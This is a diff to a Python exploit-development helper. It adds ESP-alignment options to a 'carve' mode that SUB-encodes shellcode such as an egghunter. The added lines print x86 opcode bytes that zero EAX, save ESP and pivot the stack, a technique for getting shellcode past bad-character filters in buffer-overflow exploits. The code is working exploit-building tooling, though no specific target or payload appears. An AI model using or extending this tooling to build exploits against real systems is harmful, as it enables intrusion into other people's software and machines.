@@ -53,6 +53,8 @@ exploit.add_argument('--nops','-n',help='Enter the number of NOPs to send as an 
 
 carveRequired = carve.add_argument_group('Required Arguments')
 carveRequired.add_argument('--shellcode','-s',help="Enter the shellcode to be converted (e.g. an egghunter)",required=True,dest='egghunter')
+carveRequired.add_argument('--esp','-e',help="Enter the ESP value at the start of the carved shellcode",required=False,dest='curr_esp')
+carveRequired.add_argument('--dest-esp','-d',help="Enter the address that should contain the carved shellcode",required=False,dest='dest_esp')
 
 args = parser.parse_args()
 
@@ -164,7 +166,6 @@ def carveEncode(x):
             if (a4 - int(str(b4),16) - int(str(c4),16) - int(str(d4),16) == row4Loop):
                 break
         except Exception as e:
-            print ("Something is broken on row 4 for " + x + " " + str(e))
             b4=c4=d4=""
             break
     
@@ -180,7 +181,6 @@ def carveEncode(x):
             if (a3 - int(str(b3),16) - int(str(c3),16) - int(str(d3),16) == row3Loop):
                 break
         except:
-            print ("Something is broken on row 3 for " + x)
             b3=c3=d3=""
             break   
 
@@ -197,7 +197,6 @@ def carveEncode(x):
             if (a2 - int(str(b2),16) - int(str(c2),16) - int(str(d2),16) == row2Loop):
                 break
         except:
-            print ("Something is broken on row 2 for " + x)
             b2=c2=d2=""
             break    
     
@@ -217,12 +216,16 @@ def carveEncode(x):
             break
     #print ("Row 1: " + str(hex(a1)) + " " + str(b1) + " " + str(c1) + " " + str(d1))        
 
-    
+    # Zero EAX
+    print (("\\x25\\x4a\\x4d\\x4e\\x55"))
+    print ("\\x25\\x35\\x32\\x31\\x2a")
     print ((padAndStrip(b1) + padAndStrip(b2) + padAndStrip(b3) + padAndStrip(b4)))
     print ((padAndStrip(c1) + padAndStrip(c2) + padAndStrip(c3) + padAndStrip(c4)))
     print ((padAndStrip(d1) + padAndStrip(d2) + padAndStrip(d3) + padAndStrip(d4)))
+    # PUSH EAX, POP ESP
+    print ("\\x50")    
     return
-    
+
 def padAndStrip(byte):
     address = str.format('\\x{:02x}', int(byte,16))
     return address
@@ -334,22 +337,41 @@ def main():
         
     elif (args.subparser == "carve"):
         a = args.egghunter.replace("\\x","")
-        
-        # Zero EAX
-        print ("\x25\x4a\x4d\x4e\x55")
-        print ("\x25\x35\x32\x31\x2a")
-        
-        # Save ESP into EAX
-        print ("\x54\x58")
-        
-        
-        
+               
         for x in allChar:
             if x not in badChars:
                 
                 availChars.append(hex(x))
         
         print (availChars)
+        
+        # Zero EAX
+        print (("\\x25\\x4a\\x4d\\x4e\\x55"))
+        print ("\\x25\\x35\\x32\\x31\\x2a")
+        
+        # Save ESP into EAX
+        print ("\\x54\\x58")
+        
+        startEsp = args.curr_esp
+        destEsp = args.dest_esp
+        
+        if args.curr_esp and args.dest_esp:
+            # SUB EAX to set ESP to necessary underflow 
+            # SUB EAX
+            # SUB EAX
+            # SUB EAX
+            # PUSH EAX, POP ESP
+            x  = hex((int(destEsp,16) - int(startEsp,16)))[2:]
+            
+            diff_esp = int("FFFFFFFF",16) - int(x,16)
+            carveEncode(str(hex(diff_esp)[2:]))
+            #carveEncodeEsp(startEsp,destEsp)
+        
+        else:
+            print ("CALCULATE ESP ALIGNMENT MANUALLY")
+        # PUSH EAX, POP ESP
+        print ("\\x50\\x5c")
+        
         rev = ("".join(reversed([a[i:i+2] for i in range(0, len(a), 2)])))
         n = 8
         rev_list = [rev[i:i+n] for i in range(0, len(rev), n)]
